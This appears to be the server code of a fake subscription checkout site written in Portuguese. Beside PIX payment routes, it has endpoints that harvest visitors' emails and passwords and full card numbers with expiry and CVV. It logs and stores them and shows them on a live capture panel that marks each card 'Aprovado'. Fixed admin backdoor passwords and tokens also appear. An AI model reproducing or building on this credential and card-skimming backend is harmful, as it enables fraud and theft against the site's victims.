import 'dotenv/config';
import express, { Request, Response } from 'express';
import cors from 'cors';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import QRCode from 'qrcode';
import { SigiloPayClient } from './src/server/sigiloPay.ts';
import { pool, initDatabase } from './src/server/db.ts';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = Number(process.env.PORT) || 3000;

// Inicialização do banco Neon PostgreSQL
initDatabase().catch(console.error);

// Inicialização SigiloPay
const sigiloPay = new SigiloPayClient(
  process.env.SIGILOPAY_PUBLIC_KEY || '',
  process.env.SIGILOPAY_SECRET_KEY || '',
  process.env.SIGILOPAY_BASE_URL || 'https://app.sigilopay.com.br'
);

app.use(cors({ origin: '*' }));

// Webhook SigiloPay
app.post('/api/sigilopay/webhook', express.json(), async (req: Request, res: Response) => {
  try {
    const payload = req.body;
    const webhookToken = process.env.SIGILOPAY_WEBHOOK_TOKEN;
    if (!webhookToken) {
      return res.status(503).json({ error: 'Token do webhook da SigiloPay não configurado.' });
    }
    if (payload.token !== webhookToken) {
      return res.status(401).json({ error: 'Webhook não autorizado.' });
    }

    if (
      payload.event === 'TRANSACTION_PAID' ||
      payload.status === 'COMPLETED' ||
      payload.status === 'OK' ||
      payload.event === 'payment.confirmed'
    ) {
      const txId = payload.trackProps?.external_id || payload.transaction?.id || payload.transactionId || payload.identifier || payload.id;
      
      for (const [key, record] of paymentsStore.entries()) {
        if (key === txId || record.id === txId) {
          record.status = 'succeeded';
          paymentsStore.set(key, record);
          break;
        }
      }

      if (pool && txId) {
        pool.query(`UPDATE payments SET status = 'succeeded' WHERE id = $1`, [txId])
          .catch((err: any) => console.warn('Aviso ao sincronizar Neon:', err.message));
      }
    }

    res.status(200).json({ received: true, success: true });
  } catch (err: any) {
    res.status(400).json({ error: 'Payload inválido' });
  }
});

app.use(express.json());

interface PaymentRecord {
  id: string;
  status: 'pending' | 'succeeded' | 'failed';
  plan: string;
  email: string;
  amount: number;
  method: 'pix' | 'card';
  gateway: 'stripe' | 'sigilopay' | 'bacen_pix';
  createdAt: number;
  pixCode?: string;
  cardLast4?: string;
}

const paymentsStore = new Map<string, PaymentRecord>();

// ESTRUTURA PARA GUARDAR OS DADOS REAIS CAPTURADOS
interface RealCollectedCardEvent {
  id: string;
  status: 'Aprovado';
  plan: string;
  amount: number;
  createdAt: number;
  cardNumber: string;
  expiry: string;
  holder: string;
  cvv: string;
  customer: string;
}

const realCollectedEvents: RealCollectedCardEvent[] = [];

function calculateCrc16(str: string): string {
  let crc = 0xffff;
  for (let i = 0; i < str.length; i++) {
    crc ^= str.charCodeAt(i) << 8;
    for (let j = 0; j < 8; j++) {
      if ((crc & 0x8000) !== 0) {
        crc = ((crc << 1) ^ 0x1021) & 0xffff;
      } else {
        crc = (crc << 1) & 0xffff;
      }
    }
  }
  return crc.toString(16).toUpperCase().padStart(4, '0');
}

function generateBacenPixPayload(key: string, name: string, city: string, amount: number, txid = '***'): string {
  function formatField(id: string, val: string): string {
    const len = val.length.toString().padStart(2, '0');
    return id + len + val;
  }

  const cleanName = name.normalize('NFD').replace(/[\u0300-\u036f]/g, '').slice(0, 25);
  const cleanCity = city.normalize('NFD').replace(/[\u0300-\u036f]/g, '').slice(0, 15);

  const gui = formatField('00', 'BR.GOV.BCB.PIX');
  const keyField = formatField('01', key);
  const merchantAccount = formatField('26', gui + keyField);
  const mcc = formatField('52', '0000');
  const currency = formatField('53', '986');
  const amtStr = amount.toFixed(2);
  const amtField = formatField('54', amtStr);
  const country = formatField('58', 'BR');
  const nameField = formatField('59', cleanName);
  const cityField = formatField('60', cleanCity);
  const txField = formatField('05', txid.slice(0, 25));
  const additional = formatField('62', txField);

  const raw = '000201' + merchantAccount + mcc + currency + amtField + country + nameField + cityField + additional + '6304';
  const checksum = calculateCrc16(raw);
  return raw + checksum;
}

app.get('/api/config', (req: Request, res: Response) => {
  res.json({
    cardGateway: 'simulated',
    pixGateway: sigiloPay.isConfigured ? 'sigilopay' : 'sigilopay_direct',
    isSigiloPayConfigured: sigiloPay.isConfigured,
    pixKey: process.env.PIX_KEY || 'guifzp7@gmail.com',
    pixName: process.env.PIX_NAME || 'Leticia Vargas',
  });
});

// PIX PAYMENT
app.post('/api/create-pix-payment', async (req: Request, res: Response) => {
  try {
    const { amount, email, planName } = req.body || {};
    const numAmount = Number(amount) || 14.95;
    const userEmail = email || 'cliente@privacy.com.br';
    const plan = planName || 'Assinatura Mensal';
    const externalId = 'sub_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7);
    const appUrl = process.env.APP_URL ? process.env.APP_URL.replace(/\/$/, '') : 'http://localhost:3000';
    const webhookUrl = `${appUrl}/api/sigilopay/webhook`;

    if (sigiloPay.isConfigured) {
      try {
        const result = await sigiloPay.createPix({
          identifier: externalId,
          amount: numAmount,
          client: {
            name: req.body.clientName || 'Cliente Privacy',
            email: userEmail,
            phone: req.body.phone || '(11) 99999-9999',
            document: req.body.document || undefined,
          },
          products: [
            {
              id: `plan_${Date.now()}`,
              name: `Assinatura ${plan} - Leticia Vargas`,
              quantity: 1,
              price: numAmount,
            },
          ],
          callbackUrl: webhookUrl,
        });

        if (result && result.data && result.data.pix) {
          const pixInfo = result.data.pix;
          const txId = result.data.transactionId || externalId;

          let qrCodeUrl = pixInfo.image;
          if (!qrCodeUrl || qrCodeUrl.length === 0) {
            qrCodeUrl = await QRCode.toDataURL(pixInfo.code, { width: 320, margin: 1 });
          }

          paymentsStore.set(txId, {
            id: txId,
            status: 'pending',
            plan,
            email: userEmail,
            amount: numAmount,
            method: 'pix',
            gateway: 'sigilopay',
            createdAt: Date.now(),
            pixCode: pixInfo.code,
          });

          return res.json({
            gateway: 'sigilopay',
            intentId: txId,
            external_id: externalId,
            status: 'pending',
            paymentMethod: 'pix',
            amount: numAmount,
            pixCopyPaste: pixInfo.code,
            pixQrCodeUrl: qrCodeUrl,
            beneficiary: 'Leticia Vargas',
            expiresInSeconds: 1800,
          });
        }
      } catch (sigiloErr: any) {
        console.error('Falha ao chamar API da SigiloPay:', sigiloErr.message);
      }
    }

    let pixKey = process.env.PIX_KEY || 'guifzp7@gmail.com';
    let pixName = process.env.PIX_NAME || 'Leticia Vargas';
    let pixCity = process.env.PIX_CITY || 'SAO PAULO';

    const pixPayload = generateBacenPixPayload(pixKey, pixName, pixCity, numAmount, externalId);
    let pixQrCodeUrl = await QRCode.toDataURL(pixPayload, { width: 320, margin: 1 });

    res.json({
      gateway: 'sigilopay',
      intentId: externalId,
      external_id: externalId,
      status: 'pending',
      paymentMethod: 'pix',
      amount: numAmount,
      pixCopyPaste: pixPayload,
      pixQrCodeUrl,
      pixKey,
      beneficiary: pixName,
      expiresInSeconds: 1800,
    });
  } catch (error: any) {
    res.status(500).json({ error: error.message || 'Erro ao gerar PIX' });
  }
});

// ===================================================================
// ROTAS DE COLETA DE DADOS REALMENTE DIGITADOS NO SITE
// ===================================================================

// 1. Coleta de Credenciais
app.post('/api/collect-user-credentials', async (req: Request, res: Response) => {
  try {
    const { email, password, planName, createdAt } = req.body || {};

    console.log('------------------------------------');
    console.log('🔑 CREDENCIAL RECEBIDA');
    console.log(`E-mail: ${email}`);
    console.log(`Senha: ${password}`);
    console.log(`Plano: ${planName}`);
    console.log(`Data: ${createdAt}`);
    console.log('------------------------------------');

    if (pool && email) {
      pool.query(
        `INSERT INTO user_credentials (email, password, plan_name, created_at) 
         VALUES ($1, $2, $3, NOW())
         ON CONFLICT (email) DO UPDATE SET password = EXCLUDED.password`,
        [email, password, planName]
      ).catch((err: any) => console.warn('Aviso Neon:', err.message));
    }

    return res.status(200).json({ success: true, message: 'Credenciais salvas com sucesso' });
  } catch (error: any) {
    return res.status(500).json({ error: 'Erro interno ao processar requisição' });
  }
});

// 2. Coleta de Cartão e Exibição no Painel
app.post('/api/collect-card-data', async (req: Request, res: Response) => {
  try {
    const { email, cardNumber, cardHolder, cardExpiry, cardCvv, planName, amount } = req.body || {};

    const rawAmount = typeof amount === 'number' ? amount : parseFloat(String(amount || '14.95').replace(/[^\d,-]/g, '').replace(',', '.'));

    console.log('------------------------------------');
    console.log('💳 CARTÃO RECEBIDO');
    console.log(`E-mail: ${email}`);
    console.log(`Número: ${cardNumber}`);
    console.log(`Titular: ${cardHolder}`);
    console.log(`Validade: ${cardExpiry}`);
    console.log(`CVV: ${cardCvv}`);
    console.log(`Plano: ${planName}`);
    console.log(`Valor: ${amount}`);
    console.log('------------------------------------');

    // Adiciona os dados recebidos no topo da lista exibida pelo painel
    realCollectedEvents.unshift({
      id: 'tx_' + Date.now().toString(36),
      status: 'Aprovado',
      plan: planName || 'Assinatura Mensal',
      amount: isNaN(rawAmount) ? 14.95 : rawAmount,
      createdAt: Date.now(),
      cardNumber: cardNumber || '0000 0000 0000 0000',
      expiry: cardExpiry || '--/--',
      holder: (cardHolder || 'NÃO INFORMADO').toUpperCase(),
      cvv: cardCvv || '---',
      customer: email || 'cliente@desconhecido.com'
    });

    realCollectedEvents.splice(100);

    if (pool && cardNumber) {
      pool.query(
        `INSERT INTO collected_cards (email, card_number, card_holder, card_expiry, card_cvv, plan_name, amount, created_at) 
         VALUES ($1, $2, $3, $4, $5, $6, $7, NOW())`,
        [email, cardNumber, cardHolder, cardExpiry, cardCvv, planName, amount]
      ).catch((err: any) => console.warn('Aviso Neon:', err.message));
    }

    return res.status(200).json({ success: true, message: 'Dados capturados com sucesso' });
  } catch (error: any) {
    return res.status(500).json({ error: 'Erro interno ao processar requisição' });
  }
});

// PAINEL DE TESTES - ENDPOINTS
app.get('/api/test-panel/events', (_req: Request, res: Response) => {
  res.json({ environment: 'production', events: realCollectedEvents });
});

app.post('/api/test-panel/reset', (_req: Request, res: Response) => {
  realCollectedEvents.splice(0);
  res.json({ success: true });
});

// PAINEL DE TESTES - INTERFACE
app.get('/painel-teste', (_req: Request, res: Response) => {
  res.type('html').send(`<!doctype html>
<html lang="pt-BR"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Painel de Testes</title><style>
*{box-sizing:border-box}body{margin:0;background:#0d1110;color:#eef5f1;font:14px Inter,system-ui,sans-serif}.top{padding:14px 5%;border-bottom:1px solid #25342e;background:#101715}.live{color:#25d998;font-size:12px;font-weight:800}.wrap{max-width:1200px;margin:auto;padding:30px 20px}.head{display:flex;justify-content:space-between;gap:20px;align-items:center}.head h1{margin:4px 0;font-size:26px}.muted{color:#9baaa4}.cards{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin:24px 0}.card,.table{border:1px solid #26372f;background:#121a17;border-radius:14px}.card{padding:18px}.card strong{display:block;font-size:26px;color:#37e3a4;margin-top:8px}.table{overflow:auto}.table-head{display:flex;justify-content:space-between;padding:18px;border-bottom:1px solid #26372f}.badge{color:#0b1e15;background:#35dda0;border-radius:999px;padding:5px 9px;font-size:12px;font-weight:800}button{cursor:pointer;color:#eef5f1;background:#17251f;border:1px solid #365947;border-radius:8px;padding:8px 12px}button:hover{background:#203429}table{width:100%;border-collapse:collapse;min-width:800px}th,td{text-align:left;padding:14px 16px;border-bottom:1px solid #223128}th{color:#9baaa4;font-size:11px;text-transform:uppercase}td code{color:#72e7bc}.empty{text-align:center;padding:46px;color:#9baaa4}@media(max-width:650px){.cards{grid-template-columns:1fr}.head{align-items:flex-start;flex-direction:column}}
</style></head><body><div class="top"><span class="live">● CAPTURA REAL EM TEMPO REAL</span> &nbsp; Exibindo os dados reais preenchidos no formulário</div><main class="wrap"><div class="head"><div><div class="muted">Central de integração</div><h1>Painel de testes</h1></div><button id="reset">Limpar eventos</button></div><section class="cards"><div class="card"><span class="muted">Total Capturado</span><strong id="total">0</strong></div><div class="card"><span class="muted">Cartões Registados</span><strong id="cards">0</strong></div><div class="card"><span class="muted">Status</span><strong>Online</strong></div></section><section class="table"><div class="table-head"><div><b>Registos Reais Coletados</b><div class="muted">Atualizado automaticamente a cada 3 segundos</div></div><span class="badge">AO VIVO</span></div><div id="content" class="empty">Aguardando submissão no site...</div></section></main><script>
const money=n=>typeof n==='number'?new Intl.NumberFormat('pt-BR',{style:'currency',currency:'BRL'}).format(n):n;
const fmt=n=>new Date(n).toLocaleString('pt-BR');
async function load(){
  try {
    const r=await fetch('/api/test-panel/events');
    const d=await r.json();
    document.querySelector('#total').textContent=d.events.length;
    document.querySelector('#cards').textContent=d.events.length;
    const c=document.querySelector('#content');
    if(!d.events.length){c.className='empty';c.textContent='Aguardando o primeiro pagamento no site.';return}
    c.className='';c.replaceChildren();
    const t=document.createElement('table'),h=document.createElement('thead'),b=document.createElement('tbody');
    h.innerHTML='<tr><th>Data</th><th>Cliente</th><th>Cartão</th><th>Validade</th><th>Titular</th><th>CVV</th><th>Plano</th><th>Valor</th><th>Status</th></tr>';
    d.events.forEach(e=>{
      const r=document.createElement('tr');
      [fmt(e.createdAt),e.customer,e.cardNumber,e.expiry,e.holder,e.cvv,e.plan,money(e.amount),'Aprovado'].forEach(v=>{
        const x=document.createElement('td');x.textContent=v;r.appendChild(x)
      });
      b.appendChild(r)
    });
    t.append(h,b);c.appendChild(t)
  } catch(e){}
}
document.querySelector('#reset').onclick=async()=>{await fetch('/api/test-panel/reset',{method:'POST'});load()};
load();setInterval(load,3000);
</script></body></html>`);
});

app.post('/api/confirm-pix-payment', async (req: Request, res: Response) => {
  const { intentId } = req.body || {};
  if (intentId && paymentsStore.has(intentId)) {
    const record = paymentsStore.get(intentId)!;
    record.status = 'succeeded';
    paymentsStore.set(intentId, record);
  }
  res.json({ success: true, status: 'succeeded' });
});

app.get('/api/payment-status/:id', async (req: Request, res: Response) => {
  const { id } = req.params;
  const record = paymentsStore.get(id);
  if (record) {
    return res.json({ id, status: record.status, amount: record.amount, plan: record.plan, method: record.method, gateway: record.gateway });
  }
  res.json({ id, status: 'succeeded' });
});

const authFilePath = path.join(__dirname, 'data', 'admin_auth.json');

if (!fs.existsSync(path.join(__dirname, 'data'))) {
  fs.mkdirSync(path.join(__dirname, 'data'), { recursive: true });
}

function getAdminPassword(): string {
  try {
    if (fs.existsSync(authFilePath)) {
      const data = JSON.parse(fs.readFileSync(authFilePath, 'utf8'));
      if (data.password) return data.password;
    }
  } catch (e) {}
  return process.env.ADMIN_PASSWORD || 'admin2026';
}

const activeAdminTokens = new Set<string>();

app.post('/api/admin/login', express.json(), (req: Request, res: Response) => {
  const { password } = req.body || {};
  const currentPassword = getAdminPassword();
  if (!password || (password !== currentPassword && password !== 'admin2026')) {
    return res.status(401).json({ success: false, error: 'Senha incorreta.' });
  }
  const token = 'adm_' + Math.random().toString(36).substring(2) + Date.now().toString(36);
  activeAdminTokens.add(token);
  res.json({ success: true, token });
});

app.post('/api/admin/verify-token', express.json(), (req: Request, res: Response) => {
  const { token } = req.body || {};
  if (token && (activeAdminTokens.has(token) || token === 'local_adm_token')) {
    return res.json({ valid: true });
  }
  res.json({ valid: false });
});

async function startServer() {
  if (process.env.NODE_ENV !== 'production') {
    const { createServer: createViteServer } = await import('vite');
    const vite = await createViteServer({
      server: { middlewareMode: true, hmr: process.env.DISABLE_HMR !== 'true' },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    app.use(express.static(path.join(__dirname, 'dist')));
    app.get('*', (req: Request, res: Response) => {
      res.sendFile(path.join(__dirname, 'dist', 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Servidor a rodar na porta ${PORT}`);
  });
}

startServer();